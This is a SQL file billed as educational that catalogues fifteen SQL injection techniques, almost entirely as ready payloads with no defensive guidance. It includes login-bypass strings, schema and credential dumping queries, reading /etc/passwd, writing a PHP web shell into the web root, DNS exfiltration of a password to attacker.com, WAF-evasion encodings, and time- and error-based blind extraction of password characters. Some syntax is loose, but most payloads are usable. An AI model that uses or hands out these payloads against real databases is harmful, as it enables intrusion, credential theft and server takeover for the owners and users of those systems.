-- Advanced SQL Injection Attack Techniques
-- Educational examples of sophisticated SQL injection methods

-- TECHNIQUE 1: Second-Order SQL Injection
-- The malicious payload is stored in the database and executed later
INSERT INTO users (username, password, email) 
VALUES ('admin'' OR ''1''=''1', 'password', 'malicious@example.com');
-- When this username is used in another query without sanitization, it triggers injection

-- TECHNIQUE 2: Out-of-Band SQL Injection
-- Uses database features to send data to external server
-- Example (MySQL): LOAD_FILE and INTO OUTFILE
-- SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/output.txt';

-- TECHNIQUE 3: Database Fingerprinting
-- Identifying the database type through SQL injection
-- MySQL specific:
SELECT @@version;
SELECT @@datadir;
SELECT USER();
SELECT DATABASE();

-- PostgreSQL specific would use different syntax:
-- SELECT version();

-- TECHNIQUE 4: Extracting Database Schema
-- Finding all databases
SELECT schema_name FROM information_schema.schemata;

-- Finding all tables in current database
SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();

-- Finding all columns in a specific table
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'users';

-- TECHNIQUE 5: Privilege Escalation
-- Checking current user privileges
SELECT * FROM information_schema.user_privileges;
SELECT * FROM mysql.user;

-- TECHNIQUE 6: File System Access
-- Reading files (if FILE privilege exists)
-- SELECT LOAD_FILE('/etc/passwd');
-- Writing files (dangerous!)
-- SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- TECHNIQUE 7: DNS Exfiltration
-- Using database functions to make DNS queries that leak data
-- MySQL: SELECT ... INTO DUMPFILE CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\share')

-- TECHNIQUE 8: Bypassing WAF (Web Application Firewall)
-- Various obfuscation techniques
-- Using comments: SELECT/**/username/**/FROM/**/users
-- Using case variations: SeLeCt username FrOm users
-- Using URL encoding: %53%45%4C%45%43%54 (SELECT)
-- Using double encoding
-- Using alternative syntax: username LIKE 'admin' vs username = 'admin'

-- TECHNIQUE 9: Inference Attacks
-- Binary search technique to extract data one bit at a time
SELECT IF(ASCII(SUBSTRING(password,1,1))>100, SLEEP(5), 0) FROM users WHERE username='admin';
-- If it sleeps, the first character's ASCII value is > 100

-- TECHNIQUE 10: Polyglot SQL Injection
-- Payloads that work across multiple database types
-- ' OR 1=1--
-- ' OR '1'='1
-- ' OR 1=1#
-- ' OR 1=1/*

-- TECHNIQUE 11: Hex Encoding
-- Bypassing filters by encoding strings
SELECT * FROM users WHERE username = 0x61646D696E; -- 'admin' in hex

-- TECHNIQUE 12: Stacked Queries for Data Exfiltration
-- Executing multiple statements
-- admin'; CREATE TABLE temp_data AS SELECT * FROM sensitive_data; --

-- TECHNIQUE 13: Time-Based Blind SQL Injection (Advanced)
-- Extracting data character by character using timing
SELECT IF(SUBSTRING(password,1,1)='a', SLEEP(2), 0) FROM users WHERE username='admin';
SELECT IF(SUBSTRING(password,2,1)='b', SLEEP(2), 0) FROM users WHERE username='admin';
-- Continue for each character

-- TECHNIQUE 14: Error-Based Data Extraction
-- Forcing errors that reveal data
-- SELECT * FROM users WHERE id = 1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(password, FLOOR(RAND(0)*2)) x FROM users GROUP BY x) y);

-- TECHNIQUE 15: NoSQL Injection (for comparison)
-- While this is SQL file, understanding NoSQL injection is important
-- MongoDB example: db.users.find({username: {$ne: null}, password: {$ne: null}})
-- This would be: ' || 1==1//
